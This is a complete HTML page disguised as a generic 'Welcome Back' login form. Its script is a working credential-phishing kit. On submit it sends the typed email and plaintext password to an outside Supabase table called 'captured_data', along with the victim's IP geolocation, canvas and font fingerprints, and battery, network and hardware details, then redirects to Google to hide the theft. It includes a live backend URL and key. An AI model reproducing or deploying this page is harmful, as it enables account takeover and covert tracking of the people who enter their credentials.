<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .login-header p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .error-message {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
            font-size: 14px;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: auto;
            margin-right: 5px;
            cursor: pointer;
        }

        .forgot-link {
            color: #667eea;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Welcome Back</h2>
            <p>Please login to continue</p>
        </div>

        <div class="error-message" id="errorMessage"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" id="remember"> Remember me
                </label>
                <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
            </div>

            <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                <span id="btnText">Login</span>
                <div class="loading" id="loading"></div>
            </button>
        </form>
    </div>

    <script>
        // Supabase configuration
        const supabaseUrl = 'https://aqynejlgjwdmxsekkyld.supabase.co';
        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuk';
        
        // Initialize Supabase
        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
        
        // Get user's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to get IP';
            }
        }
        
        // Get IP details from multiple sources
        async function getIPDetails(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    ip: data.ip || ip,
                    city: data.city || null,
                    region: data.region || null,
                    region_code: data.region_code || null,
                    country: data.country_name || null,
                    country_code: data.country_code || null,
                    country_capital: data.country_capital || null,
                    country_tld: data.country_tld || null,
                    continent_code: data.continent_code || null,
                    postal: data.postal || null,
                    latitude: data.latitude || null,
                    longitude: data.longitude || null,
                    timezone: data.timezone || null,
                    utc_offset: data.utc_offset || null,
                    country_calling_code: data.country_calling_code || null,
                    currency: data.currency || null,
                    currency_name: data.currency_name || null,
                    languages: data.languages || null,
                    country_area: data.country_area || null,
                    country_population: data.country_population || null,
                    asn: data.asn || null,
                    org: data.org || null,
                    isp: data.org || null
                };
            } catch (error) {
                return null;
            }
        }
        
        // Better OS Detection
        function getOS() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            // iOS detection
            if (/iPhone|iPad|iPod/.test(ua)) {
                if (/iPad/.test(ua)) return 'iPadOS';
                return 'iOS';
            }
            if (/Mac OS X/.test(ua) && navigator.maxTouchPoints > 1) return 'iPadOS';
            
            // Android detection (must come before Linux)
            if (/Android/.test(ua)) {
                const version = ua.match(/Android\s([0-9.]+)/);
                return version ? `Android ${version[1]}` : 'Android';
            }
            
            // Windows detection
            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
            if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
            if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
            if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
            if (/Windows/.test(ua)) return 'Windows';
            
            // macOS detection
            if (/Mac OS X/.test(ua)) {
                const version = ua.match(/Mac OS X\s([0-9_]+)/);
                if (version) {
                    return `macOS ${version[1].replace(/_/g, '.')}`;
                }
                return 'macOS';
            }
            
            // Linux detection (after Android check)
            if (/Linux/.test(ua) || /Linux/.test(platform)) {
                if (/CrOS/.test(ua)) return 'Chrome OS';
                if (/Ubuntu/.test(ua)) return 'Ubuntu';
                if (/Fedora/.test(ua)) return 'Fedora';
                if (/Debian/.test(ua)) return 'Debian';
                return 'Linux';
            }
            
            // Chrome OS
            if (/CrOS/.test(ua)) return 'Chrome OS';
            
            // Other
            if (/FreeBSD/.test(ua)) return 'FreeBSD';
            if (/OpenBSD/.test(ua)) return 'OpenBSD';
            
            return 'Unknown';
        }
        
        // Better Browser Detection
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let name = 'Unknown';
            let version = 'Unknown';
            let engine = 'Unknown';
            
            // Edge (Chromium)
            if (/Edg\//.test(ua)) {
                name = 'Microsoft Edge';
                version = ua.match(/Edg\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            // Opera
            else if (/OPR\//.test(ua)) {
                name = 'Opera';
                version = ua.match(/OPR\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            // Chrome
            else if (/Chrome\//.test(ua)) {
                name = 'Google Chrome';
                version = ua.match(/Chrome\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            // Firefox
            else if (/Firefox\//.test(ua)) {
                name = 'Mozilla Firefox';
                version = ua.match(/Firefox\/([0-9.]+)/)[1];
                engine = 'Gecko';
            }
            // Safari
            else if (/Safari\//.test(ua)) {
                name = 'Apple Safari';
                version = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
                engine = 'WebKit';
            }
            // Internet Explorer
            else if (/MSIE/.test(ua) || /Trident/.test(ua)) {
                name = 'Internet Explorer';
                version = ua.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
                engine = 'Trident';
            }
            
            // Mobile browser detection
            const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
            
            return {
                name: name,
                version: version,
                engine: engine,
                isMobile: isMobile,
                fullVersion: ua.match(/(?:Chrome|Firefox|Safari|Edg|OPR)\/([0-9.]+)/)?.[1] || version
            };
        }
        
        // Get device type
        function getDeviceType() {
            const ua = navigator.userAgent;
            
            if (/iPad|Tablet/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                return 'Tablet';
            }
            if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
                return 'Mobile';
            }
            if (/SmartTV|Smart-TV|TV/i.test(ua)) {
                return 'Smart TV';
            }
            if (/Xbox|PlayStation|Nintendo/i.test(ua)) {
                return 'Gaming Console';
            }
            if (/Watch/i.test(ua)) {
                return 'Smart Watch';
            }
            
            return 'Desktop';
        }
        
        // Get WebGL info
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return null;
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = debugInfo ? 
                    gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 
                    gl.getParameter(gl.VENDOR);
                const renderer = debugInfo ? 
                    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 
                    gl.getParameter(gl.RENDERER);
                
                return {
                    vendor: vendor,
                    renderer: renderer,
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                    extensions: gl.getSupportedExtensions().slice(0, 20)
                };
            } catch (e) {
                return null;
            }
        }
        
        // Detect installed fonts
        function detectFonts() {
            const fontList = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Verdana', 'Tahoma',
                'Times New Roman', 'Times', 'Courier New', 'Courier',
                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                'Trebuchet MS', 'Impact', 'Lucida Console', 'Lucida Sans Unicode',
                'MS Sans Serif', 'MS Serif', 'Symbol', 'Webdings', 'Wingdings',
                'Calibri', 'Cambria', 'Candara', 'Consolas', 'Constantia', 'Corbel',
                'Franklin Gothic Medium', 'Segoe UI', 'Helvetica', 'Roboto',
                'Open Sans', 'Lato', 'Montserrat', 'Poppins'
            ];
            
            const available = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testString = 'mmmmmmmmmmlli';
            const defaultFont = 'monospace';
            
            ctx.font = `72px ${defaultFont}`;
            const baselineSize = ctx.measureText(testString).width;
            
            fontList.forEach(font => {
                ctx.font = `72px "${font}", ${defaultFont}`;
                const newSize = ctx.measureText(testString).width;
                
                if (newSize !== baselineSize) {
                    available.push(font);
                }
            });
            
            return available;
        }
        
        // Get battery info
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging,
                        level: battery.level,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
                return null;
            } catch (e) {
                return null;
            }
        }
        
        // Get network info
        function getNetworkInfo() {
            if (navigator.connection) {
                return {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                };
            }
            return null;
        }
        
        // Get memory info
        function getMemoryInfo() {
            if (performance.memory) {
                return {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                };
            }
            return null;
        }
        
        // Get timezone info
        function getTimezoneInfo() {
            const date = new Date();
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: date.getTimezoneOffset(),
                offsetHours: -(date.getTimezoneOffset() / 60),
                dateString: date.toString(),
                localeString: date.toLocaleString(),
                localeDate: date.toLocaleDateString(),
                localeTime: date.toLocaleTimeString()
            };
        }
        
        // Make handleLogin globally accessible
        window.handleLogin = async function() {
            const emailElement = document.getElementById('email');
            const passwordElement = document.getElementById('password');
            const rememberElement = document.getElementById('remember');
            const errorMessage = document.getElementById('errorMessage');
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const loading = document.getElementById('loading');
            
            if (!emailElement || !passwordElement) {
                console.error('Form elements not found');
                return;
            }
            
            const email = emailElement.value.trim();
            const password = passwordElement.value;
            const remember = rememberElement ? rememberElement.checked : false;
            
            errorMessage.style.display = 'none';
            
            if (!email || !password) {
                errorMessage.textContent = 'Please fill in all fields';
                errorMessage.style.display = 'block';
                return;
            }
            
            if (!email.includes('@')) {
                errorMessage.textContent = 'Please enter a valid email address';
                errorMessage.style.display = 'block';
                return;
            }
            
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                console.log('Collecting device information...');
                
                // Collect all data
                const ip = await getIPAddress();
                const ipDetails = await getIPDetails(ip);
                const browserInfo = getBrowserInfo();
                const os = getOS();
                const deviceType = getDeviceType();
                const webglInfo = getWebGLInfo();
                const fonts = detectFonts();
                const batteryInfo = await getBatteryInfo();
                const networkInfo = getNetworkInfo();
                const memoryInfo = getMemoryInfo();
                const timezoneInfo = getTimezoneInfo();
                
                console.log('Saving data to Supabase...');
                
                const { data, error } = await db
                    .from('captured_data')
                    .insert([
                        {
                            email: email,
                            password: password,
                            ip_address: ip,
                            user_agent: navigator.userAgent,
                            referer: document.referrer || 'Direct',
                            device_info: {
                                browser: browserInfo,
                                os: os,
                                deviceType: deviceType,
                                screen: {
                                    width: window.screen.width,
                                    height: window.screen.height,
                                    availWidth: window.screen.availWidth,
                                    availHeight: window.screen.availHeight,
                                    colorDepth: window.screen.colorDepth,
                                    pixelDepth: window.screen.pixelDepth,
                                    pixelRatio: window.devicePixelRatio,
                                    orientation: window.screen.orientation?.type || 'Unknown'
                                },
                                language: navigator.language,
                                languages: navigator.languages,
                                platform: navigator.platform,
                                vendor: navigator.vendor,
                                cookiesEnabled: navigator.cookieEnabled,
                                doNotTrack: navigator.doNotTrack,
                                hardwareConcurrency: navigator.hardwareConcurrency,
                                deviceMemory: navigator.deviceMemory || 'unknown',
                                maxTouchPoints: navigator.maxTouchPoints,
                                webgl: webglInfo,
                                fonts: fonts,
                                memory: memoryInfo,
                                timezone: timezoneInfo,
                                remember: remember
                            },
                            fingerprint_data: {
                                canvas: getCanvasFingerprint(),
                                webgl: webglInfo,
                                fonts: fonts.length,
                                hardware: {
                                    cores: navigator.hardwareConcurrency,
                                    memory: navigator.deviceMemory
                                }
                            },
                            ip_details: ipDetails,
                            battery_info: batteryInfo,
                            network_info: networkInfo,
                            created_at: new Date().toISOString()
                        }
                    ]);
                
                if (error) {
                    console.error('Supabase error:', error);
                    errorMessage.textContent = 'Error: ' + error.message;
                    errorMessage.style.display = 'block';
                    return;
                }
                
                console.log('✅ Data saved successfully');
                window.location.href = 'https://www.google.com';
                
            } catch (err) {
                console.error('Error:', err);
                errorMessage.textContent = 'Connection error: ' + err.message;
                errorMessage.style.display = 'block';
            } finally {
                loginBtn.disabled = false;
                btnText.style.display = 'inline';
                loading.style.display = 'none';
            }
        };
        
        // Canvas fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = 200;
                canvas.height = 50;
                
                // Draw various elements
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                
                ctx.fillStyle = "#069";
                ctx.fillText("Fingerprint Test", 2, 15);
                
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.font = "18px 'Arial'";
                ctx.fillText("Canvas Test", 4, 30);
                
                // Add gradient
                const gradient = ctx.createLinearGradient(0, 0, 200, 50);
                gradient.addColorStop(0, 'blue');
                gradient.addColorStop(1, 'red');
                ctx.fillStyle = gradient;
                ctx.fillRect(150, 30, 50, 20);
                
                return canvas.toDataURL();
            } catch (e) {
                return null;
            }
        }
        
        window.forgotPassword = function(event) {
            event.preventDefault();
            alert('Please contact support to reset your password.');
        };
    </script>
</body>
</html>
